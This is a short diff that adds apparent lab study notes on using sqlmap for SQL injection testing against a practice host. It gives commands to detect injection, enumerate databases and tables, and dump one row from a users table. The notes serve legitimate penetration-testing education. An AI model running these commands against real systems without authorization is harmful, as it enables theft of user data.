@@ -1,0 +1,7 @@
+- Automate SQL injection detection and exploitation
+- Most effective but it is also on of the most commonly misused tools in penetration testing
+- Using SqlMap in a controlled manner.
+- **Identify Injection and List Available Databases:** `sqlmap -u "https://store.thm/product?id=1" --dbs --level=1 --risk=1`
+- **List Tables in a Specific Database**: `sqlmap -u "https://store.thm/product?id=1" -D targetdb --tables`
+- **Retrieve a Single Row from One Specific Table**: `sqlmap -u "https://store.thm/product?id=1" -D targetdb -T users --dump --start=1 --stop=1`. The `--start=1 --stop=1` flag limit the output to a single row, which is enough to prove read access.
+- 
